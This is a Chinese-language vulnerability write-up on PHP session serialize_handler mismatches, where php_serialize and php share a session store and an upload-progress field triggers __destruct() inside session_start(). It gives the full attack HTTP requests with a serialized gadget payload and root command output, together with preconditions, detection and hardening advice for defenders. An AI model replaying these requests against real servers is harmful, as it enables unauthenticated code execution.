---
layout: post
title: 两个 session handler 用得不一样，就能在 session_start() 里执行析构
summary: 翻 php2shell 的时候顺手试了一个很老的配置组合：同一个会话目录被两种 serialize_handler 共用。写进去的字节在读取侧被切成键值再反序列化，失败清理时把已构造的对象析构掉——而这一切发生在 session_start() 内部、脚本主体之前。8.5.12 上照样成立。
tags: 漏洞分析 PHP 会话
date: 2026-10-22 08:20:00 +0800
---

这几天在看 php2shell 的两个 CVE，翻 `ext/session` 的代码时顺手试了一个很老的配置组合，结果发现它在打了补丁的版本上照样成立。

它跟那两个 CVE 没关系。PHP 官方对这类问题的态度也很明确：这属于配置和用法层面的既有行为，不算缺陷——两种 handler 的限制在手册里写了很多年，反序列化失败后清理已构造对象也是既有设计。所以补丁修不到它，只能从配置和代码两边收。

下面是完整的一条链。它只要两个 HTTP 请求，不涉及内存地址、ASLR 也不用堆布局。

## 一、问题的来源：两种 handler 对同一串字节的理解不同

`session.serialize_handler` 决定会话数据怎么序列化。PHP 手册在 `php_serialize` 条目下写得很直白：

> php_serialize uses plain serialize/unserialize function internally and does not have limitations that php and php_binary have. Older serialize handlers cannot store numeric index nor string index contains special characters ( `|` and `!` ) in `$_SESSION`.

翻译一下就是两句话：

- `php_serialize` 把整个 `$_SESSION` 当成一个数组序列化，键就是字符串，`|` 在键里没有任何特殊含义；
- `php` 和 `php_binary` 是另一套写法，会话数据被拼成 `键名|序列化值`，解析的时候靠 `|` 来切分。

同一串字节，一个 handler 当普通字符，另一个 handler 当分隔符。这个差异就是整条链的起点。

## 二、成立需要哪些条件

| 条件 | 取值 | 说明 |
|---|---|---|
| `session.upload_progress.enabled` | 1（默认） | 上传进度回调在请求启动期就接管会话 |
| `session.upload_progress.cleanup` | **0** | **这一条最关键**：默认是 1，会在写入请求结束时把进度数据删掉 |
| 写入侧 handler | `php_serialize` | 键名不做限制，`|` 能原样存进去 |
| 读取侧 handler | `php` 或 `php_binary` | 按第一个 `|` 切分 |
| 两侧 `session.save_path` | 相同 | 会话目录必须共用 |
| 读取侧脚本 | 调用了 `session_start()` | 解码在函数内部发生 |
| 可用类 | 已加载且带 `__destruct()` | 业务类、`opcache.preload`、`auto_prepend_file` 都算 |

最后一条决定这条链能走多远：没有可用的析构类，它最多让会话解码失败。

也就是说，这不是"任何 PHP 站都能打"。真实环境里要同时满足"两个 handler 不一致"和"cleanup 被关掉"，前者通常出现在老代码和迁移未收尾的项目里，后者不常见——但它确实存在，而且一旦存在，后面全是自动的。

## 三、写入：把对象字节塞进键名

上传进度的会话键名，是 `session.upload_progress.prefix` 加上客户端提交的 `PHP_SESSION_UPLOAD_PROGRESS` 字段值。字段值里放 `|` 加一段序列化数据就行：

```http
POST /upload.php HTTP/1.1             ← 这个实例的 handler 是 php_serialize
Host: <writer>
Cookie: PHPSESSID=chain2
Content-Type: multipart/form-data; boundary=----p2sb

------p2sb
Content-Disposition: form-data; name="PHPSESSID"

chain2
------p2sb
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"

|O:6:"Gadget":1:{s:3:"cmd";s:2:"id";}
------p2sb
Content-Disposition: form-data; name="f"; filename="x.txt"
Content-Type: application/octet-stream

ZZZZ
------p2sb--
```

落盘的会话记录长这样：

```
a:1:{s:45:"p2sprog_|O:6:"Gadget":1:{s:3:"cmd";s:2:"id";}";a:5:{...}}
```

我们那段对象字节完整地躺在**键名字符串**里，`|` 也原样保留。这就是"写入侧"的全部工作——不需要登录，不需要写文件权限。

## 四、读取：切分、构造、失败、析构

读取侧用一个 handler 是 `php` 的实例访问同一个会话：

```http
GET /index.php HTTP/1.1
Host: <reader>
Cookie: PHPSESSID=chain2
```

`ps_srlzr_decode_php()` 的处理顺序是这样的：

1. 在缓冲区里找到第一个 `|`，前半段当键名；
2. 对后半段调 `php_var_unserialize()`；
3. 我们的 `O:6:"Gadget":...` 被成功构造成对象；
4. 紧随其后的容器尾巴（`";a:5:{...}`）让反序列化失败；
5. 失败路径走 `PHP_VAR_UNSERIALIZE_DESTROY` → `var_destroy()`，已经构造出来的对象被释放；
6. 对象的 `__destruct()` 开始执行。

第 6 步发生在 `session_start()` 内部。我用带毫秒时间戳的析构函数测了一下位置：

```
BODY port=8301 t=.001150     ← 写入侧请求，正常跑完
DTOR port=8300 t=.207007     ← 读取侧请求：析构在 session_start() 里触发
BODY port=8300 t=.207687     ← 读取侧脚本主体，比析构晚 0.68ms
```

读取侧的响应里同时出现两样东西：

```
[DTOR-RCE] uid=0(root) gid=0(root) groups=0(root)
Warning: session_start(): Failed to decode session object. Session has been destroyed
BODY
```

一条 warning 加一行命令输出。前者说明解码确实失败了，后者说明对象已经被构造出来、并且执行了析构里的代码。

## 五、为什么打补丁不解决它

我把同一套请求打在 8.5.12 上，同样成功。

原因是这条链踩的两块地都不在补丁范围里：一是旧 handler 对 `|` 的解释，这是手册里写着的限制，多年没变；二是反序列化失败后清理已构造值这个行为，它是既有设计，不是 2026 年那两个 CVE 修的"状态没收拾"。

所以升级到 8.5.12 / 8.4.27 / 8.3.36 / 8.2.35 之后，这条路径依然在。要挡住它得改配置和代码。

## 六、影响，以及它到底能干什么

满足条件时，一个未认证请求可以在业务逻辑开始执行之前，触发任意一个**已加载类**的 `__destruct()`。

执行点在鉴权之前，所以"先判断登录再执行"这类防护拦不住它——那时候还没到判断那一步。

后果取决于那个类能做什么：析构里写文件、发网络请求、读配置、调其他方法，都算。反过来，如果没有合适的类，这条链就只是解码失败。

## 七、怎么判断一个目标有没有这个组合

我做了两级确认，刻意分开，免得把"配置不对"说成"能执行命令"：

第一级只看一件事：写入侧投递之后，读取侧有没有出现 `Failed to decode session object`。出现，说明读取侧确实解到了写入侧写进去的字节。这一级不执行任何命令。

第二级才带上目标自带的析构类，看命令输出。这一级必须有授权才能做。

这一级设计还有个好处：如果两侧其实用的是同一个 handler，或者 `cleanup=1` 已经把数据清掉了，第一级就不会亮。也就是说，不亮就是真的没这个组合，不是"没测出来"。

顺手也写了个 nuclei 模板，只做第一级——发一个 `stdClass` 探测值，看读取侧有没有那条 decode 告警，不执行任何命令。两个端点分属不同实例的时候用 `-V` 把地址分别传进去。

## 八、加固

按有效性排序：

1. 同一个会话存储只用一种 `session.serialize_handler`，新代码统一 `php_serialize`；
2. `session.upload_progress.cleanup` 保持默认的 1；
3. `session.use_strict_mode=1`，别让客户端自己带会话 id；
4. 不要把请求里能控制的数据写进 `$_SESSION`；
5. 排查 `__destruct()`：别在析构里执行命令、写任意路径、发起外部请求；
6. 需要隔离的时候，用独立的 `session.save_path`，不要让不同配置的应用共用会话目录。

其中第 1 和第 6 条是根上的，其余是纵深。

## 最后

这个问题的形状挺有意思：不是代码写错，也不是运行时被撕开一个口子，而是**两套约定不一样，而它们共用了同一份存储**。

官方不认为它是缺陷，我不觉得这判断有问题——手册把限制写清楚了，反序列化失败后释放已构造对象也是合理设计。但它确实构成一条可利用的路径，只要有人恰好把两个 handler 配到了一起，还把 cleanup 关了。

这类东西不会出现在补丁清单里，也不会被扫描器当成洞。它只在有人真的去读那两个配置项的时候才浮出来。
